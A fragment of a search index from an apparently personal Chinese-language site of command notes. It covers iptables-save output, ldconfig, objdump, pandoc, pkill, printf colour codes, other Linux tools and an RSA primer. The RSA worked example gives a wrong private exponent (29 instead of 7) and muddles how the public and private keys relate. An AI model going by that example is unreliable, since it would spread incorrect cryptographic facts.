这表示下面这些是nat表中的配置\n:PREROUTING ACCEPT [5129516:445315174]\n# :PREROUTING ACCEPT，表示nat表中的PREROUTING 链默认报文策略是接受（匹配不到规则继续） ，\n\n# [5129516:445315174] 即[packet, bytes]，表示当前有5129516个包(445315174字节)经过nat表的PREROUTING 链\n:INPUT ACCEPT [942957:151143842]\n:OUTPUT ACCEPT [23898:3536261]\n:POSTROUTING ACCEPT [23898:3536261]\n-- 解释同上\n:DOCKER - [0:0]\n-- 解释同上（此条是自定义链）\n---------- 下面开始按条输出所有规则----------\n[4075:366986] -A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER\n-- [4075:366986]即[packet, bytes]，表示经过此规则的包数，字节数。 后面部分则是用iptables命令配置此规则的命令（详解选项可参考iptables帮助）。\n[0:0] -A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER\n[0:0] -A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE\n[2:188] -A POSTROUTING -s 192.168.122.0/24 -d 224.0.0.0/24 -j RETURN\n[0:0] -A POSTROUTING -s 192.168.122.0/24 -d 255.255.255.255/32 -j RETURN\n[0:0] -A POSTROUTING -s 192.168.122.0/24 ! -d 192.168.122.0/24 -p tcp -j MASQUERADE --to-ports 1024-65535\n[0:0] -A POSTROUTING -s 192.168.122.0/24 ! -d 192.168.122.0/24 -p udp -j MASQUERADE --to-ports 1024-65535\n[0:0] -A POSTROUTING -s 192.168.122.0/24 ! -d 192.168.122.0/24 -j MASQUERADE\n[0:0] -A DOCKER -i docker0 -j RETURN\n--以上规则同第一条规则的解释\nCOMMIT\n-- 应用上述配置\n# Completed on Tue Jan 15 15:42:32 2019","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-iptables-save.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-iptables-save.html"},{"title":"join","text":"处理两个文件之间的数据 -t join默认以空格符分隔数据，并且比对第一个字段的数据\n如果忽略两个文件相同，则将两笔数据联成一行，且第一个字段放在第一个 -i 忽略大小写 -1 数字的1，表示第一个文件要用哪个字段来分析 -2 数字的2，表示第二个文件要用哪个字段分析","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-join.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-join.html"},{"title":"ldconfig","text":"动态链接库管理命令，其目的为了让动态链接库为系统所共享 ldconfig的主要用途 搜索出可共享的动态链接库，库文件的格式为：lib***.so.**，进而创建出动态装入程序(ld.so)所需的链接和缓存文件.\n缓存文件默认为/etc/ld.so.cache，该文件保存已排好序的动态链接库名字列表.\n搜索范围: 默认搜寻/lilb和/usr/lib 搜索配置文件/etc/ld.so.conf内所列的目录下的库文件 注解 ldconfig通常在系统启动时运行，而当用户安装了一个新的动态链接库时，就需要手工运行这个命令。 往/lib和/usr/lib里面加东西，是不用修改/etc/ld.so.conf文件的，\n但是添加完后需要调用下ldconfig，不然添加的library会找不到。 如果添加的library不在/lib和/usr/lib里面的话，就一定要修改/etc/ld.so.conf文件，往该文件追加library所在的路径，\n然后也需要重新调用下ldconfig命令。\n比如在安装MySQL的时候，其库文件/usr/local/mysql/lib，就需要追加到/etc/ld.so.conf文件中。\n命令如下: # echo \"/usr/local/mysql/lib\" >> /etc/ld.so.conf\n\n# ldconfig -v | grep mysql 如果添加的library不在/lib或/usr/lib下，但是却没有权限操作写/etc/ld.so.conf文件的话，\n这时就需要往export里写一个全局变量LD_LIBRARY_PATH，就可以了 参数说明 -v , --verbose 显示正在扫描的目录及搜索到的动态链接库,还有它所创建的链接的名字 -n <dir> 仅扫描命令行指定的目录,不扫描默认目录(/lib,/usr/lib),也不扫描配置文件/etc/ld.so.conf所列的目录. -N 不重建缓存文件(/etc/ld.so.cache).若未用-X选项,ldconfig照常更新文件的链接. -X 不更新文件的链接.若未用-N选项,则缓存文件正常更新. -f <CONF> 指定动态链接库的配置文件为CONF,系统默认为/etc/ld.so.conf. -C <CACHE> 指定生成的缓存文件为CACHE,系统默认的是/etc/ld.so.cache,此文件存放已排好序的可共享的动态链接库的列表. -r <ROOT> 改变应用程序的根目录为ROOT(是调用chroot函数实现的).\n选择此项时,系统默认的配置文件/etc/ld.so.conf,实际对应的为ROOT/etc/ld.so.conf.\n如用-r/usr/zzz时,打开配置文件/etc/ld.so.conf时,实际打开的是/usr/zzz/etc/ld.so.conf文件.\n用此选项,可以大大增加动态链接库管理的灵活性. -l 通常情况下,ldconfig搜索动态链接库时将自动建立动态链接库的链接.\n选择此项时,将进入专家模式,需要手工设置链接.一般用户不用此项. -p , --print-cache 指示ldconfig打印出当前缓存文件所保存的所有共享库的名字. -c <FORMAT> , --format= <FORMAT> 指定缓存文件所使用的格式,共有三种:ld(老格式),new(新格式)和compat(兼容格式,此为默认格式). -V 打印出ldconfig的版本信息,而后退出. --help , --usage 或者直接横杠 - , 让ldconfig打印出其帮助信息,而后退出.","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-ldconfig.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-ldconfig.html"},{"title":"lsblk","text":"列出所有储存装置 -d 仅列出磁盘本身，不列出分区数据 -f 同时列出磁盘内的文件系统名称 -i 使用ASCII的线段输出，不适用复杂编码 -m 同时输出该装置在 /dev 下的权限信息 -p 列出该装置的完整文件名，而不是仅列出最后的名字 -t 列出该磁盘装置的详细数据，包括磁盘队列机制、预读写的数据量大小等","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-lsblk.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-lsblk.html"},{"title":"lszrz","text":"安装: apt install lrzsz 这是一个工具包, 包含 sz, rz指令,\n可用于xshell这种ssh工具时, 发送/上传本地文件. sz: 下载终端文件到本地 rz: 在终端下载本地文件 用法: sz [文件名, 支持多个]\n\n# 直接出发文件选择框自己选择文件\nrz 注解 在公司内网机的MobaXterm上调用失败, 不知是版本问题还是啥","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-lszrz.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-lszrz.html"},{"title":"mail","text":"发送信息 语法: main -s '$标题' $username@$host < $file","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-mAIL.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-mAIL.html"},{"title":"mkdir","text":"创建文件夹 -p 如果没有则创建（多级目录的情况） 如果有 不作操作不报错 -v 创建时输出","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-mkdir.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-mkdir.html"},{"title":"more","text":"根据窗口大小，一页一页的显示文件内容 more执行后的操作键: 空格: 显示下一屏 enter: 一次滚动一行 b: 回滚一屏 f: 前滚一屏 q: 退出 /word: 搜索word","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-more.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-more.html"},{"title":"nohup","text":"不挂断地运行命令。no hangup的缩写，意即\"不挂断\"。 nohup运行命令，忽略所有挂断（SIGHUP）信号； 仅不挂断的运行，注意没有后台运行功能\n用nohup运行命令可以使命令永久的执行下去，和用户终端没有关系，\n例如我们断开SSH连接都不会影响他的运行 &是指在后台运行，但当用户退出(挂起)的时候，命令自动也跟着退出 那么，可以巧妙的吧他们结合起来用就是 nohup COMMAND & 这样就能使命令永久的在后台执行","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-noHup.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-noHup.html"},{"title":"nslookup","text":"使用系统配置进行域名解析 用法: nslookup [-query=[type]] [hostname|ip] 参数 -query=type 查询的类型，除了传统的IP与主机名对应外，DNS还有很多信息","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-nslookup.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-nslookup.html"},{"title":"ntpdate","text":"检索ip是否可以作为ntp对时服务器: ntpdate -d ip -a Keyid 使用 Keyid 来认证全部数据包。 -b 通过调用 settimeofday 子例程来增加时钟的时间。 -d 指定调试方式。判断 ntpdate 命令会产生什么结果（不产生实际的结果）。 结果再现在屏幕上。这个标志使用无特权的端口。 -e AuthenticationDelay 指定延迟认证处理的时间秒数。 -k KeyFile 当不使用缺省值 /etc/ntp.keys 文件时，为包含密钥的文件指定一个不同的名称。 -o Version 当轮询它的发出数据包时，指定使用的 NTP 版本实现。 Version 的值可以是 1，2，3。缺省值是 3。 -p Samples 指定从每个服务器获取的样本的数目。 Samples 的值在 1 和 8 之间，并包括 1 和 8。它的缺省值是 4。 -s 指定日志操作 syslog 设施的使用，而不是使用标准输出。 当运行 ntpdate 命令和 cron命令时，它是很有用的。 -t TimeOut 指定等待响应的时间。给定 TimeOut 的值四舍五入为 0.2 秒的倍数。缺省值是 1 秒。 -u 指定使用无特权的端口发送数据包。 当在一个对特权端口的输入流量进行阻拦的防火墙后是很有益的， 并希望在防火墙之外和主机同步。\n防火墙是一个系统或者计算机，它控制从外网对专用网的访问。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-ntpdate.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-ntpdate.html"},{"title":"objdump","text":"参考: https://zhuanlan.zhihu.com/p/115834125 https://blog.csdn.net/wwchao2012/article/details/79980514 显示二进制文件信息 用来显示一个或者多个目标文件的信息, 可以是静态库归档文件. 语法: objdump [选项] objfile... 选项: --archive-headers , -a 显示档案库的成员信息,类似 ls -l 将 lib*.a 的信息列出。 -b bfdname , --target= bfdname 指定目标码格式。\n这不是必须的， objdump 能自动识别许多格式，比如：\n$objdump -b oasys -m vax -h fu.o\n显示 fu.o 的头部摘要信息，明确指出该文件是 Vax 系统下用 Oasys 编译器生成的目标文件。\nobjdump -i 将给出这里可以指定的目标码格式列表。 -C , --demangle 将底层的符号名解码成用户级名字，除了去掉所开头的下划线之外，\n还使得C++函数名以可理解的方式显示出来。 --debugging , -g 显示调试信息。企图解析保存在文件中的调试信息并以C语言的语法显示出来。\n仅仅支持某些类型的调试信息。有些其他的格式被 readelf -w 支持。 -e , --debugging-tags 类似 -g 选项，但是生成的信息是和 ctags 工具相兼容的格式。 --disassemble , -d 从 objfile 中反汇编那些特定指令机器码的 section 。 -D , --disassemble-all 与 -d 类似，但反汇编所有 section. --prefix-addresses 反汇编的时候，显示每一行的完整地址。这是一种比较老的反汇编格式 -E B , -E L , --endian= <big|little> 指定目标文件的小端。这个项将影响反汇编出来的指令。\n在反汇编的文件没描述小端信息的时候用。\n例如 S-records 。 -f , --file-headers 显示 objfile 中每个文件的整体头部摘要信息 -h , --section-headers , --headers 显示目标文件各个 section 的头部摘要信息。 -H , --help 简短的帮助信息。 -i , --info 显示对于 -b 或者 -m 选项可用的架构和目标格式列表。 -j name , --section= name 仅仅显示指定名称为 name 的 section 的信息 -l , --line-numbers 用文件名和行号标注相应的目标代码，仅仅和 -d 、 -D 或者 -r 一起使用使用 -ld 和使用 -d 的区别不是很大，\n在源码级调试的时候有用，要求编译时使用了 -g 之类的调试编译选项。 -m machine , --architecture= machine 指定反汇编目标文件时使用的架构，当待反汇编文件本身没描述架构信息的时候(比如 S-records )，\n这个选项很有用。可以用 -i 选项列出这里能够指定的架构. --reloc , -r 显示文件的重定位入口。如果和 -d 或者 -D 一起使用，重定位部分以反汇编后的格式显示出来。 --dynamic-reloc , -R 显示文件的动态重定位入口，仅仅对于动态目标文件意义，比如某些共享库。 -s , --full-contents 显示指定 section 的完整内容。默认所有的非空 section 都会被显示。 -S , --source 尽可能反汇编出源代码，尤其当编译的时候指定了 -g 这种调试参数时，效果比较明显。隐含了 -d 参数。 --show-raw-insn 反汇编的时候，显示每条汇编指令对应的机器码，如不指定 --prefix-addresses ，这将是缺省选项。 --no-show-raw-insn 反汇编时，不显示汇编指令的机器码，如不指定 --prefix-addresses ，这将是缺省选项。 --start-address= address 从指定地址开始显示数据，该选项影响 -d 、 -r 和 -s 选项的输出。 --stop-address= address 显示数据直到指定地址为止，该项影响 -d 、 -r 和 -s 选项的输出。 -t , --syms 显示文件的符号表入口。类似于 nm -s 提供的信息 -T , --dynamic-syms 显示文件的动态符号表入口，仅仅对动态目标文件意义，比如某些共享库。\n它显示的信息类似于 nm -D|--dynamic 显示的信息。 -V , --version 版本信息 --all-headers , -x 显示所可用的头信息，包括符号表、重定位入口。 -x 等价于 -a -f -h -r -t 同时指定。 -z , --disassemble-zeroes 一般反汇编输出将省略大块的零，该选项使得这些零块也被反汇编。 @file 可以将选项集中到一个文件中，然后使用这个 @file 选项载入。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-objdump.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-objdump.html"},{"title":"open","text":"打开文件等 在MacOS上用法 说明 从命令行打开文件.\n默认情况下, 会使用该文件对应设置的默认打开方式打开;\n如果是格式化的URL, 将打开URL 用法: open [-e] [-t] [-f] [-W] [-R] [-n] [-g] [-h] [-s <partial SDK name>][-b <bundle identifier>] [-a <application>] [-u URL] [filenames] [--args arguments] 选项: -a                    使用指定的程序打开\n--arch ARCH           使用给定的cpu架构类型和子类型打开\n-b                    使用指定的 应用程序标识符 打开\n-e                    使用文本编辑器打开\n-t                    使用默认文本编辑器打开\n-f                    从标准输入读取输入并使用 TextEdit 打开\n-F  --fresh           Launches the app fresh, that is, without restoring windows. Saved persistent state is lost, excluding Untitled documents.\n-R, --reveal          Selects in the Finder instead of opening.\n-W, --wait-apps       Blocks until the used applications are closed (even if they were already running).\n    --args            All remaining arguments are passed in argv to the application's main() function instead of opened.\n-n, --new             Open a new instance of the application even if one is already running.\n-j, --hide            Launches the app hidden.\n-g, --background      Does not bring the application to the foreground.\n-h, --header          Searches header file locations for headers matching the given filenames, and opens them.\n-s                    For -h, the SDK to use; if supplied, only SDKs whose names contain the argument value are searched.\n                      Otherwise the highest versioned SDK in each platform is used.\n-u, --url URL         Open this URL, even if it matches exactly a filepath\n-i, --stdin  PATH     Launches the application with stdin connected to PATH; defaults to /dev/null\n-o, --stdout PATH     Launches the application with /dev/stdout connected to PATH;\n    --stderr PATH     Launches the application with /dev/stderr connected to PATH to\n    --env    VAR      Add an enviroment variable to the launched process, where VAR is formatted AAA=foo or just AAA for a null string value.","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-open.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-open.html"},{"title":"RSA算法","text":"参考: https://zhuanlan.zhihu.com/p/48249182 (RSA这个写的比较详细, 但是看着头疼, 后面有空继续看) https://www.openssl.net.cn/docs/3.html (这个是详细的中文说明, 没空看) 属于 公钥加密算法 、 非对称加密算法 模运算 模运算即求余运算。\"模\"是\"Mod\"的音译。\n和模运算紧密相关的一个概念是\"同余\"。\n数学上，当两个整数除以同一个正整数，若得相同余数，则二整数同余。 两个整数a，b，若它们除以正整数m所得的余数相等，则称a，b对于模m同余，记作: a ≡ b (mod m) 读作：a同余于b模m，或者，a与b关于模m同余。例如: 26 ≡ 14 (mod 12)。 互质关系 如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是互质关系（coprime）。\n比如，15和32没有公因子，所以它们是互质关系。这说明，不是质数也可以构成互质关系。 关于互质关系，不难得到以下结论： 任意两个质数构成互质关系，比如13和61。 一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。 如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。 1和任意一个自然数是都是互质关系，比如1和99。 p是大于1的整数，则p和p-1构成互质关系，比如57和56。 p是大于1的奇数，则p和p-2构成互质关系，比如17和15。 欧拉函数 思考以下问题:: 任意给定正整数n，请问在小于等于n的正整数之中，有多少个与n构成互质关系？（比如，在1到8之中，有多少个数与8构成互质关系？） 计算这个值的方法就叫做欧拉函数，以φ(n)表示。在1到8之中，与8形成互质关系的是1、3、5、7，所以 φ(n) = 4。 第一种情况 如果n=1，则 φ(1) = 1 。因为1与任何数（包括自身）都构成互质关系。 第二种情况 如果n是质数，则 φ(n)=n-1 。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系。 第三种情况 如果n是质数的某一个次方，即 n = p&#94;k (p为质数，k为大于等于1的整数)，则 φ ( n ) = φ ( p k ) = p k − p k − 1 比如: φ(8) = φ(2&#94;3) =2&#94;3 - 2&#94;2 = 8 -4 = 4。 这是因为只有当一个数不包含质数p(包含是指是质数p的倍数)，\n才可能与n互质(因为若一个数包含质数p, 则不满足 互质关系结论 第二点). 而包含质数p的数一共有p&#94;(k-1)个，即1×p、2×p、3×p、...、p&#94;(k-1)×p, 这里可以推导: - 第一个数是1xp, 是第一个\n- 第二个数是2xp, 是第二个\n- \\.\\.\\.\n- 最后一个数是p&#94;(k-1)×p, 是第p&#94;(k-1)个 故一共有 p&#94;(k-1) 个包含p的数. 把它们去除，剩下的就是与n互质的数。\n上面的式子还可以写成下面的形式: φ ( n ) = φ ( p k ) = p k − p k − 1 = p k (1 − ( 1 )/( p ) ) 可以看出，上面的第二种情况是 k=1 时的特例。 第四种情况 如果n可以分解成两个互质的整数之积: n = p1 × p2 则: φ(n) = φ(p1p2) = φ(p1)φ(p2) 即积的欧拉函数等于各个因子的欧拉函数之积。比如: φ(56)=φ(8×7)=φ(8)×φ(7)=4×6=24。 这一条的证明要用到\"中国剩余定理\"，这里就不展开了，只简单说一下思路: 如果a与p1互质(a < p1)，b与p2互质(b < p2)，c与p1p2互质(c < p1p2)，则c与数对 (a,b) 是一一对应关系。\n由于a的值有φ(p1)种可能，b的值有φ(p2)种可能，则数对 (a,b) 有φ(p1)φ(p2)种可能，而c的值有φ(p1p2)种可能，\n所以φ(p1p2)就等于φ(p1)φ(p2)。 第五种情况 因为任意一个大于1的正整数，都可以写成一系列质数的积 n = p k 1 1 p k 2 2 ... p kr r 根据 第四种情况 结论，得到 φ ( n ) = φ ( p k 1 1 ) φ ( p k 2 2 )... φ ( p kr r ) 再根据 第三种情况 的结论，得到 φ ( n ) = p k 1 1 (1 − ( 1 )/( p 1 ) ) p k 2 2 (1 − ( 1 )/( p 2 ) )... p kr r (1 − ( 1 )/( p r ) ) 也就等于 φ ( n ) = n (1 − ( 1 )/( p 1 ) )(1 − ( 1 )/( p 2 ) )...(1 − ( 1 )/( p r ) ) 这就是欧拉函数的通用计算公式。比如，1323的欧拉函数，计算过程如下 φ (1323) = φ (3 3 x 7 2 ) = 1323(1 − ( 1 )/( 3 ) )(1 − ( 1 )/( 7 ) ) = 756 欧拉定理 欧拉函数的用处，在于欧拉定理。\"欧拉定理\"指的是: 如果两个正整数a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立 a φ ( n ) ≡ 1 ( mod n ) 也就是说，a的φ(n)次方被n除的余数为1。或者说，a的φ(n)次方减去1，可以被n整除。\n比如，3和7互质，而7的欧拉函数φ(7)等于6，所以3的6次方（729）减去1，可以被7整除（728/7=104）。 欧拉定理有一个特殊情况。 假设正整数a与质数p互质，因为质数p的φ(p)等于p-1，则欧拉定理可以写成 a p − 1 ≡ 1 ( mod p ) 这就是著名的费马小定理。它是欧拉定理的特例。 欧拉定理是RSA算法的核心。理解了这个定理，就可以理解RSA。 模反元素 还剩下最后一个概念： 如果两个正整数a和n互质，那么一定可以找到整数b，使得ab-1被n整除，或者说ab被n除的余数是1. 这时，b就叫做a的\"模反元素\"。 比如，3和11互质，那么3的模反元素就是4，因为 (3 × 4)-1 可以被11整除。\n显然，模反元素不止一个， 4加减11的整数倍都是3的模反元素 {…,-18,-7,4,15,26,…}，\n即如果b是a的模反元素，则 b+kn 都是a的模反元素。 欧拉定理可以用来证明模反元素必然存在。 可以看到，a的 φ(n)-1 次方，就是a的模反元素。 RSA生成算法 具体来说: 选择两个大素数p和q,计算n=pq,且欧拉函数φ(n)=(p-1)(q-1) 选择与φ(n)互质的整数e,e就是公钥指数 计算d,满足ed≡1(mod φ(n)),d就是私钥指数 (n,e)就是公钥,(n,d)就是私钥 这里公钥(n,e)是从私钥(n,d)推导计算出来的,而无法由公钥反推私钥。 举个简单例子: p=5,q=7\nn=5*7=35\nφ(n)=(p-1)(q-1)=4*6=24 选择e=7,与24互质, 则d=7的乘法逆元mod 24=29, 则: 公钥(n=35, e=7) 私钥(n=35, d=29) 可以看出,公钥是从选择的d计算得到的e,但无法由e反推出d。\n所以,RSA算法要求私钥生成公钥,而不能由公钥生成私钥,这是RSA算法的基本原理和要求。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-openssl-Related-algorithm-RSA-algorithm.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-openssl-Related-algorithm-RSA-algorithm.html"},{"title":"一些问题说明","text":"为什么RSA算法要先生成私钥, 再推导公钥 RSA说明可见: RSA生成算法 <R_RSA生成算法> 在openssl中,我们一般: 用genrsa生成RSA私钥 用rsa推导出RSA公钥 而不能: 自己选择n和e生成公钥 再由公钥反推私钥d 这违反了RSA算法的基本原理,破坏了其安全性。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-openssl-Some-issues.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-openssl-Some-issues.html"},{"title":"pandoc","text":"一个开源的文档转换工具, 支持多种文档格式之间的互相转换. 安装: apt install pandoc 使用举例, 将md转换为html: pandoc test.md -f markdown -t html -s -o test.html 一些常用选项: -f FORMAT, -r FORMAT  --from=FORMAT, --read=FORMAT    输入文件格式\n-t FORMAT, -w FORMAT  --to=FORMAT, --write=FORMAT     输出文件格式, 某些支持自动通过后缀识别.\n-o FILE, --output=FILE                                输出文件位置\n-M <KEY[:VALUE]>, --metadata=KEY[:VALUE], --metadata-file=FILE --data-dir= DIRECTORY 依赖目录 -d <FILE> --defaults=FILE\n--file-scope\n--sandbox -s --standalone, 独立成一个文件?\n--template=FILE -V <KEY[:VALUE]> --variable=KEY[:VALUE]\n--wrap=auto|none|preserve\n--ascii\n--toc, --table-of-contents\n--toc-depth=NUMBER -N --number-sections\n--number-offset=NUMBERS\n--top-level-division=section|chapter|part --extract-media= PATH 输出图片目录, 比如将doc转换为rst时\n--resource-path=SEARCHPATH -H FILE --include-in-header=FILE -B FILE --include-before-body=FILE -A FILE --include-after-body=FILE\n--no-highlight\n--highlight-style=STYLE|FILE\n--syntax-definition=FILE\n--dpi=NUMBER\n--eol=crlf|lf|native\n--columns=NUMBER -p --preserve-tabs\n--tab-stop=NUMBER\n--pdf-engine=PROGRAM\n--pdf-engine-opt=STRING --reference-doc= FILE 输出doc模版文件，使用模版文件转换可以把标题之类的格式搞得更规范\n--self-contained\n--embed-resources\n--request-header=NAME:VALUE\n--no-check-certificate\n--abbreviations=FILE\n--indented-code-classes=STRING\n--default-image-extension=extension -F PROGRAM --filter=PROGRAM -L SCRIPTPATH --lua-filter=SCRIPTPATH\n--shift-heading-level-by=NUMBER\n--base-header-level=NUMBER\n--track-changes=accept|reject|all\n--strip-comments\n--reference-links\n--reference-location=block|section|document\n--markdown-headings=setext|atx\n--list-tables\n--listings -i --incremental\n--slide-level=NUMBER\n--section-divs\n--html-q-tags\n--email-obfuscation=none|javascript|references\n--id-prefix=STRING -T STRING --title-prefix=STRING -c URL --css=URL\n--epub-subdirectory=DIRNAME\n--epub-cover-image=FILE\n--epub-title-page=true|false\n--epub-metadata=FILE\n--epub-embed-font=FILE\n--split-level=NUMBER\n--chunk-template=PATHTEMPLATE\n--epub-chapter-level=NUMBER\n--ipynb-output=all|none|best -C --citeproc\n--bibliography=FILE\n--csl=FILE\n--citation-abbreviations=FILE\n--natbib\n--biblatex\n--mathml\n--webtex[=URL]\n--mathjax[=URL]\n--katex[=URL]\n--gladtex\n--trace\n--dump-args\n--ignore-args\n--verbose\n--quiet\n--fail-if-warnings\n--log=FILE\n--bash-completion\n--list-input-formats\n--list-output-formats\n--list-extensions[=FORMAT]\n--list-highlight-languages\n--list-highlight-styles -D FORMAT --print-default-template=FORMAT\n--print-default-data-file=FILE\n--print-highlight-style=STYLE|FILE -v --version -h --help 将rst转换为pdf pandoc -s -o test.pdf test.rst","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-pandoc.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-pandoc.html"},{"title":"pgrep","text":"pgrep通过匹配其程序名, 获得正在被调度的进程的相关信息 常见选项: -l 同时显示进程名和PID -o 当匹配多个进程时，显示进程号最小的那个 -n 当匹配多个进程时，显示进程号最大的那个 注解 进程号越大，并不一定意味着进程的启动时间越晚 pgrep查找的是程序名，不包括其参数 pgrep相当于: ps –eo pid,cmd | awk ‘{print $1,$2}' | grep KeyWord","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-pgrep.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-pgrep.html"},{"title":"pkill","text":"类似的指令: killall kill 当作于管理进程时，pkill 命令和 killall 命令的用法相同，\n都是通过进程名杀死一类进程，该命令的基本格式如下: [root@localhost ~]# pkill [信号] 进程名 注解 即使进程是以绝对/相对路径启动, 进程名也是直接写最终启动的那个文件名即可,\n如使用 /usr/bin/top 启动了个 top ,\n使用 pkill -9 top 杀死 pkill 命令常用信号及其含义 信号编号 信号名 含义 0 EXIT 程序退出时收到该信息 1 HUP 挂掉电话线或终端连接的\n挂起信号，这个信号也会\n造成某些进程在没有终止\n的情况下重新初始化 2 INT 表示结束进程，但并不是\n强制性的，常用的 \"Ctrl+C\"\n组合键发出\n就是一个 kill -2 的信号 3 QUIT 退出。 9 KILL 杀死进程，即强制结束进程 11 SEGV 段错误 15 TERM 正常结束进程\n是 kill 命令的默认信号 还可以踢出登陆用户 除此之外，pkill 还有一个更重要的功能，即按照终端号来踢出用户登录，\n此时的 pkill 命令的基本格式如下: pkill [-t 终端号] 进程名 [-t 终端号] 选项用于按照终端号踢出用户 学习 killall 命令时，不知道大家发现没有，通过 killall 命令杀死 sshd 进程的方式来踢出用户，\n非常容易误杀死进程，要么会把 sshd 服务杀死，要么会把自己的登录终端杀死 所以，不管是使用 kill 命令按照 PID 杀死登录进程，还是使用 killall 命令按照进程名杀死登录进程，\n都是非常容易误杀死进程的，而使用 pkill 命令则不会，举个例子, 使用w命令查询本机已经登录的用户: [root@localhost ~]# w\n20:06:34 up 28 min, 3 users, load average: 0.00, 0.00, 0.00\nUSER  TTY           FROM LOGIN@  IDLE  JCPU  PCPU WHAT\nroot ttyl              -  19:47 18:52 0.01s 0.01s -bash\nroot pts/0 192.168.0.100  19:47 0.00s 0.09s 0.04s w\nroot pts/1 192.168.0.100  19:51 14:56 0.02s 0.02s -bash 可以看出当前主机已经登录了三个root用户，一个是本地终端ttyl登录，\n另外两个是从192.168.0.100登陆的远程登录 强制杀死从pts/1虚拟终端登陆的进程: [root@localhost ~]# pkill -9 -t pts/1\n[root@localhost ~]# w\n20:09:09 up 30 min, 2 users, load average: 0.00, 0.00,0.00\nUSER   TTY          FROM LOGIN@  IDLE  JCPU  PCPU WHAT\nroot  ttyl             -  19:47 21:27 0.01s 0.01s -bash\nroot pts/0 192.168.0.100  19:47 0.00s 0.06s 0.00s w 虚拟终端pts/1的登录进程已经被杀死了","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-pkill.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-pkill.html"},{"title":"printf","text":"功能 不换行打印 使用 printf \"\\e[1;36;45m%s\\e[0m\\n\" \" ${ _strs } \" 拓展--关于使用颜色输出 颜色输出相关字符说明 \\e 转义起始符，定义一个转义序列， 可以使用 033代替 [ 表示开始定义颜色 1表示高亮，36表示字体颜色为天蓝，45表示背景色为红色 \"_strs\" 属于文字内容 m 转义终止符，表示颜色定义完毕 再次使用 e[ ，表示再次开启颜色定义，0表示使用默认的颜色，m表示颜色定义结束，所以 e[0m 的作用是恢复之前的配色方案 数字与颜色关系 字体颜色(前景色): 30-37 数字 颜色 0 默认 30 黑色 31 红色 32 绿色 33 黄色 34 蓝色 35 紫色 36 天蓝色 37 白色 字背景颜色(后景色): 40-47 数字 颜色 0 默认 40 黑色 41 红色 42 绿色 43 黄色 44 蓝色 45 紫色 46 天蓝色 47 白色 其他特殊颜色-黑底彩色 黑底彩色: 90-97 数字 颜色 90 黑 91 深红 92 绿 93 黄色 94 蓝色 95 紫色 96 深绿 97 白色 字体控制选项 字体控制选项 代码 \\033[0m 关闭所有属性 \\033[1m 设置高亮度 \\033[4m 下划线 \\033[5m 闪烁 \\033[7m 反显，撞色显示，显示为白色黑底，或者显示为黑底白字 \\033[8m 消影，字符颜色将会与背景颜色相同 \\033[nA 光标上移n行 \\033[nB 光标下移n行 \\033[nC 光标右移n行 \\033[nD 光标左移n行 \\033[y;xH 设置光标位置 \\033[2J 清屏 \\033[K 清除从光标到行尾的内容 \\033[s 保存光标位置 \\033[u 恢复光标位置 \\033[?25l 隐藏光标 \\033[?25h 显示光标 另有一个更便捷的命令 tput 技巧 echo的 \\e 和 \\033 一个效果","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-printf.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-printf.html"},{"title":"cp","text":"用于复制文件或目录 -a 此选项通常在复制目录时使用，它保留链接、文件属性，并复制目录下的所有内容。其作用等于dpR参数组合。 -d 复制时保留链接。这里所说的链接相当于Windows系统中的快捷方式。 -f 覆盖已经存在的目标文件而不给出提示。 -i 与-f选项相反，在覆盖目标文件之前给出提示，要求用户确认是否覆盖，回答\"y\"时目标文件将被覆盖。 -p 除复制文件的内容外，还把修改时间和访问权限也复制到新文件中。 -r 若给出的源文件是一个目录文件，此时将复制该目录下所有的子目录和文件。 -l 不复制文件，只是生成链接文件。 -n 不覆盖已存在的文件(除非使用了-i/-f)\nDo not overwrite an existing file.  (The -n option overrides any previous -f or -i options.) 注解 像cp, mv这种指令, 一般都是当目标位置不存在时, 就重命名, 